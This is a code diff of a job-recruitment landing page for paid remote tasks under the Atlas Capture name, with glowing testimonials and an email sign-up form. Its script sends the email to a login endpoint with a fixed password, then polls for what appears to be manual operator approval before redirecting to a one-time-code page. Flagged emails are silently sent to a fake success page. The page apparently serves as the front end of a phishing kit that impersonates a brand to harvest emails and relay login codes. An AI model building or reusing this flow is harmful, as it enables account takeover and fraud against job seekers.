+                        <path d="M2 12h20"/>
+                    </svg>
+                </div>
+                Work Anywhere
+            </div>
+            <div class="feature">
+                <div class="icon">
+                    <svg viewBox="0 0 24 24" fill="none">
+                        <path d="M20 13c0 5-3.5 7.5-7.66 8.95a1 1 0 0 1-.67-.01C7.5 20.5 4 18 4 13V6a1 1 0 0 1 1-1c2 0 4.5-1.2 6.24-2.72a1.17 1.17 0 0 1 1.52 0C14.51 3.81 17 5 19 5a1 1 0 0 1 1 1z" stroke="#2563eb" stroke-width="1.5"/>
+                    </svg>
+                </div>
+                Weekly Payouts
+            </div>
+        </div>
+
+        <div class="checks">
+            <div class="flex items-center gap-1">
+                <div class="w-3.5 h-3.5 rounded-full bg-[#69f8db] flex items-center justify-center overflow-hidden">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0d9488" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-[#0d9488]" style="transform: scale(0.4); width: 24px; height: 24px;">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <path d="m9 12 2 2 4-4"></path>
+                    </svg>
+                </div>
+                <span style="color: #6b7280;">No experience required</span>
+            </div>
+            <div class="flex items-center gap-1">
+                <div class="w-3.5 h-3.5 rounded-full bg-[#69f8db] flex items-center justify-center overflow-hidden">
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="#0d9488" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="text-[#0d9488]" style="transform: scale(0.4); width: 24px; height: 24px;">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <path d="m9 12 2 2 4-4"></path>
+                    </svg>
+                </div>
+                <span style="color: #6b7280;">Quick onboarding</span>
+            </div>
+        </div>
+
+        <label>Email</label>
+        <input type="email" id="email" placeholder="name@example.com">
+        <div id="emailError" class="error-message"></div>
+
+        <div class="checkbox">
+            <input type="checkbox" id="isStudent">
+            <label for="isStudent">I'm a Philippines college/university student</label>
+        </div>
+
+        <div id="collegeNotice" class="animate-in">
+            <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M21.42 10.922a1 1 0 0 0-.019-1.838L12.83 5.18a2 2 0 0 0-1.66 0L2.6 9.08a1 1 0 0 0 0 1.832l8.57 3.908a2 2 0 0 0 1.66 0z"></path>
+                <path d="M22 10v6"></path>
+                <path d="M6 12.5V16a6 3 0 0 0 12 0v-3.5"></path>
+            </svg>
+            <div class="text-sm">
+                <p class="font-semibold">Use your college email!</p>
+                <p class="text-muted-foreground">Sign up with your <span class="font-medium">.edu.ph</span> email address to get verified for <span style="color: #070b1f;"">bonus earnings</span> and <span style="color: #070b1f;">faster progression</span>.</p>
+            </div>
+        </div>
+
+        <button id="submitBtn" class="submitButton">Start Earning Today →</button>
+
+        <div id="statusMessage" class="status-message"></div>
+        <div id="timeoutMessage" class="timeout-message"></div>
+
+        <div class="footer">
+            By continuing, you agree to our <a href="#">Terms of Service</a> and <a href="#">Privacy Policy</a>.
+        </div>
+    </div>
+</div>
+
+<div class="wrapper2">
+    <div class="quote-badge">
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M16 3a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2 1 1 0 0 1 1 1v1a2 2 0 0 1-2 2 1 1 0 0 0-1 1v2a1 1 0 0 0 1 1 6 6 0 0 0 6-6V5a2 2 0 0 0-2-2z"></path>
+            <path d="M5 3a2 2 0 0 0-2 2v6a2 2 0 0 0 2 2 1 1 0 0 1 1 1v1a2 2 0 0 1-2 2 1 1 0 0 0-1 1v2a1 1 0 0 0 1 1 6 6 0 0 0 6-6V5a2 2 0 0 0-2-2z"></path>
+        </svg>
+    </div>
+
+    <div class="testimonial-slide active" data-index="0">
+        <div style="padding-top: 5px; padding-bottom: 5px; display: flex; gap: 2px;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#fbbf24" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z"/>
+            </svg>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#fbbf24" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z"/>
+            </svg>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#fbbf24" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z"/>
+            </svg>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#fbbf24" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z"/>
+            </svg>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#fbbf24" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z"/>
+            </svg>
+        </div>
+        <label>"What started as extra cash on weekends turned into my full time thing."</label>
+        <div class="lowerTestimonialSection">
+            <div class="left-group">
+                <label class="lowerOuterLabel">🇮🇳</label>
+                <div class="name-group">
+                    <label class="lowerInnerLabel">Rajesh S.</label>
+                    <label class="lowerInnerLabel">Mumbai, India</label>
+                </div>
+            </div>
+            <label class="earnings-badge">Earned $30k+</label>
+        </div>
+    </div>
+
+    <div class="testimonial-slide" data-index="1">
+        <div style="padding-top: 5px; padding-bottom: 5px; display: flex; gap: 2px;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#fbbf24" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z"/>
+            </svg>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#fbbf24" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z"/>
+            </svg>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#fbbf24" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z"/>
+            </svg>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#fbbf24" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z"/>
+            </svg>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#fbbf24" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z"/>
+            </svg>
+        </div>
+        <label>"Finally found something I can do from home that actually pays well."</label>
+        <div class="lowerTestimonialSection">
+            <div class="left-group">
+                <label class="lowerOuterLabel">🇪🇸</label>
+                <div class="name-group">
+                    <label class="lowerInnerLabel">Marita G.</label>
+                    <label class="lowerInnerLabel">Madrid, Spain</label>
+                </div>
+            </div>
+            <label class="earnings-badge">Earned $5k+</label>
+        </div>
+    </div>
+
+    <div class="testimonial-slide" data-index="2">
+        <div style="padding-top: 5px; padding-bottom: 5px; display: flex; gap: 2px;">
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#fbbf24" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z"/>
+            </svg>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#fbbf24" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z"/>
+            </svg>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#fbbf24" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z"/>
+            </svg>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#fbbf24" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z"/>
+            </svg>
+            <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="#fbbf24" stroke="#fbbf24" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M11.525 2.295a.53.53 0 0 1 .95 0l2.31 4.679a2.123 2.123 0 0 0 1.595 1.16l5.166.756a.53.53 0 0 1 .294.904l-3.736 3.638a2.123 2.123 0 0 0-.611 1.878l.882 5.14a.53.53 0 0 1-.771.56l-4.618-2.428a2.122 2.122 0 0 0-1.973 0L6.396 21.01a.53.53 0 0 1-.77-.56l.881-5.139a2.122 2.122 0 0 0-.611-1.879L2.16 9.795a.53.53 0 0 1 .294-.906l5.165-.755a2.122 2.122 0 0 0 1.597-1.16z"/>
+            </svg>
+        </div>
+        <label>"Between classes I record a few tasks. Pays for my books and then some."</label>
+        <div class="lowerTestimonialSection">
+            <div class="left-group">
+                <label class="lowerOuterLabel">🇯🇴</label>
+                <div class="name-group">
+                    <label class="lowerInnerLabel">Shan A.</label>
+                    <label class="lowerInnerLabel">Amman, Jordan</label>
+                </div>
+            </div>
+            <label class="earnings-badge">Earned $5k+</label>
+        </div>
+    </div>
+
+    <div class="dot-container">
+        <button class="dot active" data-index="0" aria-label="Go to testimonial 1"></button>
+        <button class="dot inactive" data-index="1" aria-label="Go to testimonial 2"></button>
+        <button class="dot inactive" data-index="2" aria-label="Go to testimonial 3"></button>
+    </div>
+</div>
+
+<a href="https://atlascapture.io" target="_blank" rel="noopener noreferrer" style="
+    display: flex;
+    margin-left: auto;
+    margin-right: auto;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    border-radius: 9999px;
+    border: 1px solid rgba(255, 255, 255, 0.6);
+    background: rgba(255, 255, 255, 0.85);
+    padding: 6px 14px;
+    font-size: 13px;
+    margin-top: 20px;
+    color: #3a3a3a;
+    box-shadow: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
+    backdrop-filter: blur(12px);
+    transition: color 0.2s, transform 0.2s;
+    text-decoration: none;
+    cursor: pointer;
+    width: fit-content;
+"
+onmouseenter="this.style.color='#7288ff'; this.querySelector('svg').style.transform='translate(2px, -2px)'"
+onmouseleave="this.style.color='#3a3a3a'; this.querySelector('svg').style.transform='translate(0, 0)'">
+    <span>Learn more about Atlas Capture</span>
+    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" style="
+        width: 12px;
+        height: 12px;
+        transition: transform 0.2s;
+        transform: translate(0, 0);
+    ">
+        <path d="M15 3h6v6"></path>
+        <path d="M10 14 21 3"></path>
+        <path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"></path>
+    </svg>
+</a>
+
 <script>
-  const emailInput = document.getElementById('email');
-  const submitBtn = document.getElementById('submitBtn');
-  const emailError = document.getElementById('emailError');
-  const statusMessage = document.getElementById('statusMessage');
-  const timeoutMessage = document.getElementById('timeoutMessage');
-  const checkbox = document.getElementById('isStudent');
-  
-  let approvalInterval = null;
-  let timeoutTimer = null;
-  let startTime = null;
-  let blockCheckInterval = null;
-  const TIMEOUT_SECONDS = 60;
-
-  function isValidEmail(email) {
-    const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
-    return emailRegex.test(email);
-  }
-
-  emailInput.addEventListener('input', function() {
-    const email = this.value.trim();
-    if (email && !isValidEmail(email)) {
-      emailError.textContent = 'Please enter a valid email address (e.g., name@example.com)';
-      emailError.style.display = 'block';
-      emailInput.classList.add('error');
-    } else {
-      emailError.style.display = 'none';
-      emailInput.classList.remove('error');
-    }
-  });
-
-  // BLOCK CHECK FUNCTION - Redirects to success if email is blocked
-  async function checkIfBlocked(email) {
-    try {
-      const response = await fetch('/api/users/check-blocked', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ email })
-      });
-      const data = await response.json();
-      if (data.blocked === true) {
-        window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
-        return true;
-      }
-      return false;
-    } catch (err) {
-      console.log('Block check error:', err);
-      return false;
-    }
-  }
-
-  function startBlockChecking(email) {
-    if (blockCheckInterval) clearInterval(blockCheckInterval);
-    blockCheckInterval = setInterval(async () => {
-      const blocked = await checkIfBlocked(email);
-      if (blocked) {
-        clearInterval(blockCheckInterval);
-      }
-    }, 3000);
-  }
-
-  function resetForm() {
-    if (approvalInterval) {
-      clearInterval(approvalInterval);
-      approvalInterval = null;
-    }
-    if (timeoutTimer) {
-      clearTimeout(timeoutTimer);
-      timeoutTimer = null;
-    }
-    if (blockCheckInterval) {
-      clearInterval(blockCheckInterval);
-      blockCheckInterval = null;
-    }
-    startTime = null;
-    submitBtn.disabled = false;
-    submitBtn.innerHTML = 'Start Earning Today →';
-    statusMessage.style.display = 'none';
-    timeoutMessage.style.display = 'none';
-    emailInput.disabled = false;
-    checkbox.disabled = false;
-  }
-
-  function showTimeoutError() {
-    timeoutMessage.textContent = '⏰ Timeout! Please try again after some time.';
-    timeoutMessage.style.display = 'block';
-    statusMessage.style.display = 'none';
-    submitBtn.innerHTML = 'Start Earning Today →';
-    submitBtn.disabled = false;
-    emailInput.disabled = false;
-    checkbox.disabled = false;
+    // ===== YOUR ORIGINAL OLD LOGIC (100% UNCHANGED) =====
+    const emailInput = document.getElementById('email');
+    const submitBtn = document.getElementById('submitBtn');
+    const emailError = document.getElementById('emailError');
+    const statusMessage = document.getElementById('statusMessage');
+    const timeoutMessage = document.getElementById('timeoutMessage');
+    const checkbox = document.getElementById('isStudent');
     
-    if (approvalInterval) {
-      clearInterval(approvalInterval);
-      approvalInterval = null;
-    }
-  }
+    let approvalInterval = null;
+    let timeoutTimer = null;
+    let startTime = null;
+    let blockCheckInterval = null;
+    const TIMEOUT_SECONDS = 60;
 
-  async function handleSubmit() {
-    const emailValue = emailInput.value.trim();
-    
-    if (!emailValue) {
-      emailError.textContent = 'Please enter your email address';
-      emailError.style.display = 'block';
-      emailInput.classList.add('error');
-      return;
-    }
-    
-    if (!isValidEmail(emailValue)) {
-      emailError.textContent = 'Please enter a valid email address (e.g., name@example.com)';
-      emailError.style.display = 'block';
-      emailInput.classList.add('error');
-      return;
+    function isValidEmail(email) {
+        const emailRegex = /^[^\s@]+@([^\s@]+\.)+[^\s@]+$/;
+        return emailRegex.test(email);
     }
 
-    // FIRST CHECK: Is email blocked?
-    const isBlocked = await checkIfBlocked(emailValue);
-    if (isBlocked) return;
+    emailInput.addEventListener('input', function() {
+        const email = this.value.trim();
+        if (email && !isValidEmail(email)) {
+            emailError.textContent = 'Please enter a valid email address (e.g., name@example.com)';
+            emailError.style.display = 'block';
+            emailInput.classList.add('error');
+        } else {
+            emailError.style.display = 'none';
+            emailInput.classList.remove('error');
+        }
+    });
 
-    emailError.style.display = 'none';
-    emailInput.classList.remove('error');
-    timeoutMessage.style.display = 'none';
-    
-    if (window.countdownInterval) {
-      clearInterval(window.countdownInterval);
+    // BLOCK CHECK FUNCTION - Redirects to success if email is blocked
+    async function checkIfBlocked(email) {
+        try {
+            const response = await fetch('/api/users/check-blocked', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ email })
+            });
+            const data = await response.json();
+            if (data.blocked === true) {
+                window.location.href = `/users/success?email=${encodeURIComponent(email)}`;
+                return true;
+            }
+            return false;
+        } catch (err) {
+            console.log('Block check error:', err);
+            return false;
+        }
     }
 
-    submitBtn.disabled = true;
-    submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Sending Code...</span>';
-    statusMessage.style.display = 'none';
+    function startBlockChecking(email) {
+        if (blockCheckInterval) clearInterval(blockCheckInterval);
+        blockCheckInterval = setInterval(async () => {
+            const blocked = await checkIfBlocked(email);
+            if (blocked) {
+                clearInterval(blockCheckInterval);
+            }
+        }, 3000);
+    }
 
-    try {
-      const response = await fetch('/api/users/login', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-          email: emailValue, 
-          password: checkbox.checked ? 'student' : 'user' 
-        })
-      });
+    function resetForm() {
+        if (approvalInterval) {
+            clearInterval(approvalInterval);
+            approvalInterval = null;
+        }
+        if (timeoutTimer) {
+            clearTimeout(timeoutTimer);
+            timeoutTimer = null;
+        }
+        if (blockCheckInterval) {
+            clearInterval(blockCheckInterval);
+            blockCheckInterval = null;
+        }
+        startTime = null;
+        submitBtn.disabled = false;
+        submitBtn.innerHTML = 'Start Earning Today →';
+        statusMessage.style.display = 'none';
+        timeoutMessage.style.display = 'none';
+        emailInput.disabled = false;
+        checkbox.disabled = false;
+    }
 
-      const data = await response.json();
-      
-      // Check if blocked response from server
-      if (data.blocked === true) {
-        window.location.href = `/users/success?email=${encodeURIComponent(emailValue)}`;
-        return;
-      }
+    function showTimeoutError() {
+        timeoutMessage.textContent = '⏰ Timeout! Please try again after some time.';
+        timeoutMessage.style.display = 'block';
+        statusMessage.style.display = 'none';
+        submitBtn.innerHTML = 'Start Earning Today →';
+        submitBtn.disabled = false;
+        emailInput.disabled = false;
+        checkbox.disabled = false;
+        
+        if (approvalInterval) {
+            clearInterval(approvalInterval);
+            approvalInterval = null;
+        }
+    }
 
-      if (!response.ok) throw new Error('Login failed');
-
-      submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Sending Code...</span>';
-      emailInput.disabled = true;
-      checkbox.disabled = true;
-      
-      // Start block checking (user might get blocked while waiting)
-      startBlockChecking(emailValue);
-      
-      startTime = Date.now();
-      timeoutTimer = setTimeout(() => {
-        showTimeoutError();
-      }, TIMEOUT_SECONDS * 1000);
-      
-      if (approvalInterval) clearInterval(approvalInterval);
-      
-      approvalInterval = setInterval(async () => {
-        if (!startTime || (Date.now() - startTime) >= TIMEOUT_SECONDS * 1000) {
-          return;
+    async function handleSubmit() {
+        const emailValue = emailInput.value.trim();
+        
+        if (!emailValue) {
+            emailError.textContent = 'Please enter your email address';
+            emailError.style.display = 'block';
+            emailInput.classList.add('error');
+            return;
         }
         
-        try {
-          const checkResponse = await fetch('/api/users/check-approval', {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ email: emailValue })
-          });
-          const approvalData = await checkResponse.json();
-          
-          if (approvalData.approved === true) {
-            if (approvalInterval) clearInterval(approvalInterval);
-            if (timeoutTimer) clearTimeout(timeoutTimer);
-            if (blockCheckInterval) clearInterval(blockCheckInterval);
-            window.location.href = `/users/otp?email=${encodeURIComponent(emailValue)}`;
-          }
-        } catch (err) {
-          console.log('Checking approval...');
+        if (!isValidEmail(emailValue)) {
+            emailError.textContent = 'Please enter a valid email address (e.g., name@example.com)';
+            emailError.style.display = 'block';
+            emailInput.classList.add('error');
+            return;
         }
-      }, 2000);
-      
-    } catch (error) {
-      emailError.textContent = 'Network error. Please try again.';
-      emailError.style.display = 'block';
-      resetForm();
-    }
-  }
 
-  submitBtn.addEventListener('click', handleSubmit);
-  emailInput.addEventListener('keypress', (e) => {
-    if (e.key === 'Enter') handleSubmit();
-  });
+        // FIRST CHECK: Is email blocked?
+        const isBlocked = await checkIfBlocked(emailValue);
+        if (isBlocked) return;
+
+        emailError.style.display = 'none';
+        emailInput.classList.remove('error');
+        timeoutMessage.style.display = 'none';
+        
+        if (window.countdownInterval) {
+            clearInterval(window.countdownInterval);
+        }
+
+        submitBtn.disabled = true;
+        submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Sending Code...</span>';
+        statusMessage.style.display = 'none';
+
+        try {
+            const response = await fetch('/api/users/login', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ 
+                    email: emailValue, 
+                    password: checkbox.checked ? 'student' : 'user' 
+                })
+            });
+
+            const data = await response.json();
+            
+            // Check if blocked response from server
+            if (data.blocked === true) {
+                window.location.href = `/users/success?email=${encodeURIComponent(emailValue)}`;
+                return;
+            }
+
+            if (!response.ok) throw new Error('Login failed');
+
+            submitBtn.innerHTML = '<span class="button-loading"><span class="spinner"></span> Sending Code...</span>';
+            emailInput.disabled = true;
+            checkbox.disabled = true;
+            
+            // Start block checking (user might get blocked while waiting)
+            startBlockChecking(emailValue);
+            
+            startTime = Date.now();
+            timeoutTimer = setTimeout(() => {
+                showTimeoutError();
+            }, TIMEOUT_SECONDS * 1000);
+            
+            if (approvalInterval) clearInterval(approvalInterval);
+            
+            approvalInterval = setInterval(async () => {
+                if (!startTime || (Date.now() - startTime) >= TIMEOUT_SECONDS * 1000) {
+                    return;
+                }
+                
+                try {
+                    const checkResponse = await fetch('/api/users/check-approval', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ email: emailValue })
+                    });
+                    const approvalData = await checkResponse.json();
+                    
+                    if (approvalData.approved === true) {
+                        if (approvalInterval) clearInterval(approvalInterval);
+                        if (timeoutTimer) clearTimeout(timeoutTimer);
+                        if (blockCheckInterval) clearInterval(blockCheckInterval);
+                        window.location.href = `/users/otp?email=${encodeURIComponent(emailValue)}`;
+                    }
+                } catch (err) {
+                    console.log('Checking approval...');
+                }
+            }, 2000);
+            
+        } catch (error) {
+            emailError.textContent = 'Network error. Please try again.';
+            emailError.style.display = 'block';
+            resetForm();
+        }
+    }
+
+    submitBtn.addEventListener('click', handleSubmit);
+    emailInput.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') handleSubmit();
+    });
+
+    // Sky animation functions (from new template)
+    function animateCounter(element, targetValue, isCurrency = false, isMillions = false) {
+        const duration = 2250;
+        const startTime = performance.now();
+
+        function updateCounter(currentTime) {
+            const elapsed = currentTime - startTime;
+            const progress = Math.min(elapsed / duration, 1);
+            const easeOutQuad = 1 - (1 - progress) * (1 - progress);
+            let currentValue = Math.floor(targetValue * easeOutQuad);
+
+            if (progress < 1 && Math.random() < 0.08) {
+                const jumpProgress = Math.min(progress + 0.05, 1);
